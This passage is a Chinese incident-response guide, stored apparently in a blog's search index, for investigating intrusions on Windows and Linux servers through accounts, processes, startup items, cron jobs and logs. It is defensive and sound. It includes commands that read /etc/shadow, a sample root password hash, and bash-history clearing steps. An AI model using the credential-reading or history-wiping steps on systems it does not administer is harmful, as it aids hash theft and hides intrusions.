<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>应急响应</title>
    <link href="/2020/07/28/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <url>/2020/07/28/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    
    <content type="html"><![CDATA[<h2 id="来自-《Bypass公众号》-的应急响应指南"><a href="#来自-《Bypass公众号》-的应急响应指南" class="headerlink" title="来自 《Bypass公众号》 的应急响应指南"></a>来自 《Bypass公众号》 的应急响应指南</h2><a id="more"></a><h1 id="第一章：入侵排查篇"><a href="#第一章：入侵排查篇" class="headerlink" title="第一章：入侵排查篇"></a>第一章：入侵排查篇</h1><h2 id="第1篇：window入侵排查"><a href="#第1篇：window入侵排查" class="headerlink" title="第1篇：window入侵排查"></a>第1篇：window入侵排查</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p><p>常见的应急响应事件分类：</p><p>web入侵：网页挂马、主页篡改、Webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS攻击、DNS劫持、ARP欺骗</p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些Window服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h3><h4 id="1-1-检查系统账号安全"><a href="#1-1-检查系统账号安全" class="headerlink" title="1.1 检查系统账号安全"></a>1.1 检查系统账号安全</h4><p>1、查看服务器是否有弱口令，远程管理端口是否对公网开放。</p><ul><li>检查方法：据实际情况咨询相关服务器管理员。</li></ul><p>2、查看服务器是否存在可疑账号、新增账号。</p><ul><li>检查方法：打开 cmd 窗口，输入<code>lusrmgr.msc</code>命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。 </li></ul><p>3、查看服务器是否存在隐藏账号、克隆账号。</p><ul><li><p>检查方法：</p><p>a、打开注册表 ，查看管理员对应键值。</p><p>b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。</p></li></ul><p><img src="/image/sum-1-1.png" srcset="/img/loading.gif" alt=""></p><p>4、结合日志，查看管理员登录时间、用户名是否存在异常。</p><ul><li><p>检查方法：</p><p>a、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>b、导出Windows日志–安全，利用Log Parser进行分析。</p></li></ul><p><img src="/image/sum-1-2.png" srcset="/img/loading.gif" alt=""></p><h4 id="1-2-检查异常端口、进程"><a href="#1-2-检查异常端口、进程" class="headerlink" title="1.2 检查异常端口、进程"></a>1.2 检查异常端口、进程</h4><p>1、检查端口连接情况，是否有远程连接、可疑连接。</p><ul><li><p>检查方法：</p><p>a、netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED </p><p>b、根据netstat 定位出的pid，再通过tasklist命令进行进程定位 tasklist  | findstr “PID”</p></li></ul><p><img src="/image/sum-1-3.png" srcset="/img/loading.gif" alt=""></p><p>2、进程</p><ul><li><p>检查方法：</p><p>a、开始–运行–输入msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等。</p><p>b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p><p>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</p><p>d、查看可疑的进程及其子进程。可以通过观察以下内容：</p><pre><code>没有签名验证信息的进程没有描述信息的进程进程的属主进程的路径是否合法CPU或内存资源占用长时间过高的进程</code></pre></li></ul><p>3、小技巧：</p><p>​    a、查看端口对应的PID： netstat -ano | findstr “port”</p><p>​    b、查看进程对应的PID：任务管理器–查看–选择列–PID 或者  tasklist  | findstr “PID”</p><p>​    c、查看进程对应的程序位置：</p><p>​        任务管理器–选择对应进程–右键打开文件位置</p><p>​        运行输入 wmic，cmd界面 输入  process</p><p>​    d、tasklist /svc   进程–PID–服务</p><p>​    e、查看Windows服务所对应的端口：<br>​        %system%/system32/drivers/etc/services（一般%system%就是C:\Windows）</p><h4 id="1-3-检查启动项、计划任务、服务"><a href="#1-3-检查启动项、计划任务、服务" class="headerlink" title="1.3 检查启动项、计划任务、服务"></a>1.3 检查启动项、计划任务、服务</h4><p>1、检查服务器是否有异常的启动项。</p><ul><li><p>检查方法：</p><p>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。<br>b、单击开始菜单 &gt;【运行】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。<br>c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：<br>HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce<br>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p><p>d、利用安全软件查看启动项、开机时间管理等。</p><p>e、组策略，运行gpedit.msc。</p></li></ul><p><img src="/image/sum-1-4.png" srcset="/img/loading.gif" alt=""></p><p>2、检查计划任务</p><ul><li><p>检查方法：</p><p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p><p>b、单击【开始】&gt;【运行】；输入 cmd，然后输入at，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</p></li></ul><p>3、服务自启动</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入services.msc，注意服务状态和启动类型，检查是否有异常服务。</li></ul><h4 id="1-4-检查系统相关信息"><a href="#1-4-检查系统相关信息" class="headerlink" title="1.4 检查系统相关信息"></a>1.4 检查系统相关信息</h4><p>1、查看系统版本以及补丁信息</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入systeminfo，查看系统信息</li></ul><p>2、查找可疑目录及文件</p><ul><li><p>检查方法：</p><p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p><p>​    Window 2003  C:\Documents and Settings</p><p>​    Window 2008R2  C:\Users\</p><p>b、单击【开始】&gt;【运行】，输入%UserProfile%\Recent，分析最近打开分析可疑文件。</p><p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p><p>d、回收站、浏览器下载目录、浏览器历史记录</p><p>e、修改时间在创建时间之前的为可疑文件</p></li></ul><p>3、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>​    a、利用 Registry Workshop  注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。</p><p>​    b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</p><h4 id="1-5-自动化查杀"><a href="#1-5-自动化查杀" class="headerlink" title="1.5 自动化查杀"></a>1.5 自动化查杀</h4><ul><li><p>病毒查杀</p><ul><li>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li></ul></li><li><p>webshell查杀</p><ul><li>检查方法：选择具体站点路径进行webshell查杀，建议使用两款webshell查杀工具同时查杀，可相互补充规则库的不足。</li></ul></li></ul><h4 id="1-6-日志分析"><a href="#1-6-日志分析" class="headerlink" title="1.6 日志分析"></a>1.6 日志分析</h4><p>系统日志</p><ul><li><p>分析方法：</p><p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>b、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>C、导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。</p></li></ul><p>WEB访问日志</p><ul><li><p>分析方法：</p><p>a、找到中间件的web日志，打包到本地方便进行分析。</p><p>b、推荐工具：Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p><p>​                 Linux下，使用Shell命令组合查询分析</p></li></ul><h3 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="2-1-病毒分析"><a href="#2-1-病毒分析" class="headerlink" title="2.1 病毒分析"></a>2.1 病毒分析</h4><p>PCHunter：<a href="http://www.xuetr.com" target="_blank" rel="noopener">http://www.xuetr.com</a></p><p>火绒剑：<a href="https://www.huorong.cn" target="_blank" rel="noopener">https://www.huorong.cn</a></p><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>processhacker：<a href="https://processhacker.sourceforge.io/downloads.php" target="_blank" rel="noopener">https://processhacker.sourceforge.io/downloads.php</a></p><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><p>OTL：<a href="https://www.bleepingcomputer.com/download/otl/" target="_blank" rel="noopener">https://www.bleepingcomputer.com/download/otl/</a></p><p>SysInspector：<a href="http://download.eset.com.cn/download/detail/?product=sysinspector" target="_blank" rel="noopener">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p><h4 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h4><p>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe" target="_blank" rel="noopener">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a>   （推荐理由：绿色版、最新病毒库）</p><p>大蜘蛛：<a href="http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）" target="_blank" rel="noopener">http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</a></p><p>火绒安全软件：<a href="https://www.huorong.cn" target="_blank" rel="noopener">https://www.huorong.cn</a></p><p>360杀毒：<a href="http://sd.360.cn/download_center.html" target="_blank" rel="noopener">http://sd.360.cn/download_center.html</a></p><h4 id="2-3-病毒动态"><a href="#2-3-病毒动态" class="headerlink" title="2.3 病毒动态"></a>2.3 病毒动态</h4><p>CVERC-国家计算机病毒应急处理中心：<a href="http://www.cverc.org.cn" target="_blank" rel="noopener">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区：<a href="https://x.threatbook.cn" target="_blank" rel="noopener">https://x.threatbook.cn</a></p><p>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html" target="_blank" rel="noopener">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区：<a href="http://bbs.duba.net" target="_blank" rel="noopener">http://bbs.duba.net</a></p><p>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html" target="_blank" rel="noopener">http://bbs.guanjia.qq.com/forum-2-1.html</a></p><h4 id="2-4-在线病毒扫描网站"><a href="#2-4-在线病毒扫描网站" class="headerlink" title="2.4 在线病毒扫描网站"></a>2.4 在线病毒扫描网站</h4><p><a href="http://www.virscan.org" target="_blank" rel="noopener">http://www.virscan.org</a>         //多引擎在线病毒扫描网 v1.02，当前支持 41 款杀毒引擎     </p><p><a href="https://habo.qq.com" target="_blank" rel="noopener">https://habo.qq.com</a>             //腾讯哈勃分析系统</p><p><a href="https://virusscan.jotti.org" target="_blank" rel="noopener">https://virusscan.jotti.org</a>      //Jotti恶意软件扫描系统</p><p><a href="http://www.scanvir.com" target="_blank" rel="noopener">http://www.scanvir.com</a>        //针对计算机病毒、手机病毒、可疑文件等进行检测分析</p><h4 id="2-5-webshell查杀"><a href="#2-5-webshell查杀" class="headerlink" title="2.5 webshell查杀"></a>2.5 webshell查杀</h4><p>D盾_Web查杀：<a href="http://www.d99net.net/index.asp" target="_blank" rel="noopener">http://www.d99net.net/index.asp</a></p><p>河马webshell查杀：<a href="http://www.shellpub.com" target="_blank" rel="noopener">http://www.shellpub.com</a></p><p>深信服Webshell网站后门检测工具：<a href="http://edr.sangfor.com.cn/backdoor_detection.html" target="_blank" rel="noopener">http://edr.sangfor.com.cn/backdoor_detection.html</a></p><p>Safe3：<a href="http://www.uusec.com/webshell.zip" target="_blank" rel="noopener">http://www.uusec.com/webshell.zip</a></p><h2 id="第2篇：Linux入侵排查"><a href="#第2篇：Linux入侵排查" class="headerlink" title="第2篇：Linux入侵排查"></a>第2篇：Linux入侵排查</h2><h3 id="0x00-前言-1"><a href="#0x00-前言-1" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些Linux服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路-1"><a href="#0x01-入侵排查思路-1" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h3><h4 id="1-1-账号安全"><a href="#1-1-账号安全" class="headerlink" title="1.1 账号安全"></a>1.1 账号安全</h4><p><strong>基本使用：</strong></p><pre><code class="hljs groovy"><span class="hljs-number">1</span>、用户信息文件<span class="hljs-regexp">/etc/</span>passwd<span class="hljs-string">root:</span><span class="hljs-string">x:</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-string">root:</span><span class="hljs-regexp">/root:/</span>bin/bash<span class="hljs-string">account:</span><span class="hljs-string">password:</span><span class="hljs-string">UID:</span><span class="hljs-string">GID:</span><span class="hljs-string">GECOS:</span><span class="hljs-string">directory:</span>shell用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell注意：无密码只允许本机登陆，远程不允许登陆<span class="hljs-number">2</span>、影子文件<span class="hljs-regexp">/etc/</span>shadow<span class="hljs-string">root:</span>$<span class="hljs-number">6</span>$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:<span class="hljs-number">16809</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</code></pre><pre><code class="hljs properties"><span class="hljs-attr">who</span>     <span class="hljs-string">查看当前登录用户（tty本地登陆  pts远程登录）</span><span class="hljs-attr">w</span>       <span class="hljs-string">查看系统信息，想知道某一时刻用户的行为</span><span class="hljs-attr">uptime</span>  <span class="hljs-string">查看登陆多久、多少用户，负载</span></code></pre><p><strong>入侵排查：</strong></p><pre><code class="hljs routeros">1、查询特权用户特权用户(uid 为0)[root@localhost ~]# awk -F: <span class="hljs-string">'$3==0{print $1}'</span> /etc/passwd2、查询可以远程登录的帐号信息[root@localhost ~]# awk <span class="hljs-string">'/\$1|\$6/{print $1}'</span> /etc/shadow3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限[root@localhost ~]# more /etc/sudoers | grep -v <span class="hljs-string">"^#\|^$"</span> | grep <span class="hljs-string">"ALL=(ALL)"</span>4、禁用或删除多余及可疑的帐号    usermod -L<span class="hljs-built_in"> user </span>   禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头userdel<span class="hljs-built_in"> user </span>      删除user用户userdel -r<span class="hljs-built_in"> user </span>   将删除user用户，并且将/home目录下的user目录一并删除</code></pre><h4 id="1-2-历史命令"><a href="#1-2-历史命令" class="headerlink" title="1.2 历史命令"></a>1.2 历史命令</h4><p><strong>基本使用：</strong></p><pre><code class="hljs clean">通过.bash_history查看帐号执行过的系统命令<span class="hljs-number">1</span>、root的历史命令histroy<span class="hljs-number">2</span>、打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令为历史的命令增加登录的IP地址、执行命令时间等信息：<span class="hljs-number">1</span>）保存<span class="hljs-number">1</span>万条命令sed -i <span class="hljs-string">'s/^HISTSIZE=1000/HISTSIZE=10000/g'</span> /etc/profile<span class="hljs-number">2</span>）在/etc/profile的文件尾部添加如下行数配置信息：######jiagu history xianshi#########USER_IP=`who -u am i <span class="hljs-number">2</span>&gt;/dev/null | awk <span class="hljs-string">'{print $NF}'</span> | sed -e <span class="hljs-string">'s/[()]//g'</span>`<span class="hljs-keyword">if</span> [ <span class="hljs-string">"$USER_IP"</span> = <span class="hljs-string">""</span> ]thenUSER_IP=`hostname`fi<span class="hljs-keyword">export</span> HISTTIMEFORMAT=<span class="hljs-string">"%F %T $USER_IP `whoami` "</span>shopt -s histappend<span class="hljs-keyword">export</span> PROMPT_COMMAND=<span class="hljs-string">"history -a"</span>######### jiagu history xianshi ##########<span class="hljs-number">3</span>）source /etc/profile让配置生效生成效果： <span class="hljs-number">1</span>  <span class="hljs-number">2018</span><span class="hljs-number">-07</span><span class="hljs-number">-10</span> <span class="hljs-number">19</span>:<span class="hljs-number">45</span>:<span class="hljs-number">39</span> <span class="hljs-number">192.168</span><span class="hljs-number">.204</span><span class="hljs-number">.1</span> root source /etc/profile<span class="hljs-number">3</span>、历史操作命令的清除：history -c但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录。</code></pre><p><strong>入侵排查：</strong></p><pre><code class="hljs css">进入用户目录下<span class="hljs-selector-tag">cat</span> <span class="hljs-selector-class">.bash_history</span> &gt;&gt; <span class="hljs-selector-tag">history</span><span class="hljs-selector-class">.txt</span></code></pre><h4 id="1-3-检查异常端口"><a href="#1-3-检查异常端口" class="headerlink" title="1.3 检查异常端口"></a>1.3 检查异常端口</h4><p>使用netstat 网络连接命令，分析可疑端口、IP、PID</p><pre><code class="hljs mel">netstat -antlp|more查看下pid所对应的进程文件路径，运行<span class="hljs-keyword">ls</span> -l /<span class="hljs-keyword">proc</span>/$PID/exe或<span class="hljs-keyword">file</span> /<span class="hljs-keyword">proc</span>/$PID/exe（$PID 为对应的pid 号）</code></pre><h4 id="1-4-检查异常进程"><a href="#1-4-检查异常进程" class="headerlink" title="1.4 检查异常进程"></a>1.4 检查异常进程</h4><p>使用ps命令，分析进程</p><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> pid</code></pre><h4 id="1-5-检查开机启动项"><a href="#1-5-检查开机启动项" class="headerlink" title="1.5 检查开机启动项"></a>1.5 检查开机启动项</h4><p><strong>基本使用：</strong></p><p>系统运行级别示意图：</p><table><thead><tr><th align="center">运行级别</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">关机</td></tr><tr><td align="center">1</td><td align="center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td></tr><tr><td align="center">2</td><td align="center">不完全的命令行模式，不含NFS服务</td></tr><tr><td align="center">3</td><td align="center">完全的命令行模式，就是标准字符界面</td></tr><tr><td align="center">4</td><td align="center">系统保留</td></tr><tr><td align="center">5</td><td align="center">图形模式</td></tr><tr><td align="center">6</td><td align="center">重启动</td></tr></tbody></table><p>查看运行级别命令<br>    runlevel   </p><p>系统默认允许级别</p><pre><code>vi  /etc/inittabid=3：initdefault  系统开机后直接进入哪个运行级别</code></pre><p>开机启动配置文件</p><pre><code>/etc/rc.local/etc/rc.d/rc[0~6].d</code></pre><p>例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在/etc/init.d目录下，然后在/etc/rc.d/rc*.d中建立软链接即可</p><pre><code>root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</code></pre><p>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。</p><p><strong>入侵排查：</strong></p><p>启动项文件：<br>    more /etc/rc.local<br>    /etc/rc.d/rc[0~6].d<br>    ls -l /etc/rc.d/rc3.d/</p><h4 id="1-6-检查定时任务"><a href="#1-6-检查定时任务" class="headerlink" title="1.6 检查定时任务"></a>1.6 检查定时任务</h4><p><strong>基本使用</strong></p><p>1、利用crontab创建计划任务</p><ul><li>基本命令</li></ul><p>crontab -l   列出某个用户cron服务的详细内容</p><p>Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root</p><p>crontab -r   删除每个用户cront任务(谨慎：删除所有的计划任务)</p><p>crontab -e   使用编辑器编辑当前的crontab文件 </p><p>如：*/1 * * * * echo “hello world” &gt;&gt; /tmp/test.txt 每分钟写入文件</p><p>2、利用anacron实现异步定时任务调度</p><ul><li>使用案例</li></ul><p>每天运行 /home/backup.sh脚本：<br>    vi /etc/anacrontab<br>    @daily    10    example.daily   /bin/bash /home/backup.sh</p><p>当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。</p><p><strong>入侵排查</strong></p><p>重点关注以下目录中是否存在恶意脚本</p><pre><code>/var/spool/cron/* /etc/crontab/etc/cron.d/*/etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/*/etc/cron.weekly//etc/anacrontab/var/spool/anacron/*</code></pre><p>小技巧：</p><pre><code>more /etc/cron.daily/*  查看目录下所有文件</code></pre><h4 id="1-7-检查服务"><a href="#1-7-检查服务" class="headerlink" title="1.7 检查服务"></a>1.7 检查服务</h4><p><strong>服务自启动</strong></p><p>第一种修改方法：</p><pre><code>chkconfig [--level 运行级别] [独立服务名] [on|off]chkconfig –level  2345 httpd on  开启自启动chkconfig httpd on （默认level是2345）</code></pre><p>第二种修改方法：</p><pre><code>修改/etc/re.d/rc.local 文件  加入 /etc/init.d/httpd start</code></pre><p>第三种修改方法：</p><p>使用ntsysv命令管理自启动，可以管理独立服务和xinetd服务。</p><p><strong>入侵排查</strong></p><p>1、查询已安装的服务：</p><p>RPM包安装的服务</p><pre><code>chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务ps aux | grep crond 查看当前服务系统在3与5级别下的启动项 中文环境chkconfig --list | grep "3:启用\|5:启用"英文环境chkconfig --list | grep "3:on\|5:on"</code></pre><p>源码包安装的服务</p><pre><code>查看服务安装位置 ，一般是在/user/local/service httpd start搜索/etc/rc.d/init.d/  查看是否存在</code></pre><h4 id="1-8-检查异常文件"><a href="#1-8-检查异常文件" class="headerlink" title="1.8 检查异常文件"></a>1.8 检查异常文件</h4><p>1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性</p><p>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>​    可以使用find命令来查找，如 find /opt -iname “*” -atime 1 -type f  找出 /opt 下一天前访问过的文件</p><p>3、针对可疑文件可以使用stat进行创建修改时间。</p><h4 id="1-9-检查系统日志"><a href="#1-9-检查系统日志" class="headerlink" title="1.9 检查系统日志"></a>1.9 检查系统日志</h4><p>日志默认存放位置：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><table><thead><tr><th align="center">日志文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">记录了系统定时任务相关的日志</td></tr><tr><td align="center">/var/log/cups</td><td align="center">记录打印信息的日志</td></tr><tr><td align="center">/var/log/dmesg</td><td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td align="center">/var/log/mailog</td><td align="center">记录邮件信息</td></tr><tr><td align="center">/var/log/message</td><td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td align="center">/var/log/secure</td><td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>日志分析技巧：</p><pre><code class="hljs markdown">1、定位有多少IP在爆破主机的root帐号：    grep "Failed password for root" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more定位有哪些IP在爆破：grep "Failed password" /var/log/secure|grep -E -o "(25[<span class="hljs-string">0-5</span>]|2[<span class="hljs-string">0-4</span>][<span class="hljs-symbol">0-9</span>]|[<span class="hljs-string">01</span>]?[<span class="hljs-string">0-9</span>][<span class="hljs-symbol">0-9</span>]?)\.(25[<span class="hljs-string">0-5</span>]|2[<span class="hljs-string">0-4</span>][<span class="hljs-symbol">0-9</span>]|[<span class="hljs-string">01</span>]?[<span class="hljs-string">0-9</span>][<span class="hljs-symbol">0-9</span>]?)\.(25[<span class="hljs-string">0-5</span>]|2[<span class="hljs-string">0-4</span>][<span class="hljs-symbol">0-9</span>]|[<span class="hljs-string">01</span>]?[<span class="hljs-string">0-9</span>][<span class="hljs-symbol">0-9</span>]?)\.(25[<span class="hljs-string">0-5</span>]|2[<span class="hljs-string">0-4</span>][<span class="hljs-symbol">0-9</span>]|[<span class="hljs-string">01</span>]?[<span class="hljs-string">0-9</span>][<span class="hljs-symbol">0-9</span>]?)"|uniq -c爆破用户名字典是什么？ grep "Failed password" /var/log/secure|perl -e 'while($_=<span class="xml"><span class="hljs-tag">&lt;&gt;</span></span>){ /for(.*?) from/; print "$1\n";}'|uniq -c|sort -nr 2、登录成功的IP有哪些： grep "Accepted " /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more登录成功的日期、用户名、IP：grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3、增加一个用户kali日志：Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali, shell=/bin/bashJul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali<span class="hljs-section">#grep "useradd" /var/log/secure </span>4、删除用户kali日志：Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali'Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali'Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali'<span class="hljs-section"># grep "userdel" /var/log/secure</span>5、su切换用户：Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)sudo授权执行:sudo -lJul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</code></pre><h3 id="0x02-工具篇-1"><a href="#0x02-工具篇-1" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="2-1-Rootkit查杀"><a href="#2-1-Rootkit查杀" class="headerlink" title="2.1 Rootkit查杀"></a>2.1 Rootkit查杀</h4><ul><li><p>chkrootkit  </p><p>网址：<a href="http://www.chkrootkit.org" target="_blank" rel="noopener">http://www.chkrootkit.org</a> </p><pre><code class="hljs properties"><span class="hljs-attr">使用方法：</span><span class="hljs-attr">wget</span> <span class="hljs-string">ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span><span class="hljs-attr">tar</span> <span class="hljs-string">zxvf chkrootkit.tar.gz</span><span class="hljs-attr">cd</span> <span class="hljs-string">chkrootkit-0.52</span><span class="hljs-attr">make</span> <span class="hljs-string">sense</span><span class="hljs-comment">#编译完成没有报错的话执行检查</span><span class="hljs-attr">./chkrootkit</span></code></pre></li><li><p>rkhunter</p><p>网址：<a href="http://rkhunter.sourceforge.net" target="_blank" rel="noopener">http://rkhunter.sourceforge.net</a></p><pre><code class="hljs angelscript">使用方法：Wget https:<span class="hljs-comment">//nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz</span>tar -zxvf rkhunter<span class="hljs-number">-1.4</span><span class="hljs-number">.4</span>.tar.gzcd rkhunter<span class="hljs-number">-1.4</span><span class="hljs-number">.4</span>./installer.sh --installrkhunter -c</code></pre></li></ul><h4 id="2-2-病毒查杀-1"><a href="#2-2-病毒查杀-1" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h4><ul><li><p>Clamav</p><p>ClamAV的官方下载地址为：<a href="http://www.clamav.net/download.html" target="_blank" rel="noopener">http://www.clamav.net/download.html</a> </p><p>安装方式一： </p><pre><code class="hljs jboss-cli">1、安装zlib：wget http:<span class="hljs-string">//nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz</span> tar -zxvf  zlib-1.2.7.tar.gz<span class="hljs-keyword">cd</span> zlib-1.2.7<span class="hljs-comment">#安装一下gcc编译环境： yum install gcc</span>CFLAGS=<span class="hljs-string">"-O3 -fPIC"</span> <span class="hljs-string">./configure</span> <span 